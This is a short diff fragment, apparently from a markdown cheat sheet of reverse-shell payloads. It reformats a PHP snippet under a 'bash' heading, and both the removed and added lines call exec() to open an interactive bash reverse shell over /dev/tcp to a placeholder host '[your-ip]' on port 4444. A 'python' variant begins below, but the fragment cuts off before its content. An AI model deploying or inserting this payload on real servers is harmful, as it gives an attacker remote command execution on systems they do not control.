@@ -10,9 +10,7 @@
 
 ```php
 <!-- bash -->
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/[your-ip]/4444 0>&1'");
-?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[your-ip]/4444 0>&1'"); ?>
 
 <!-- python -->
 <?php
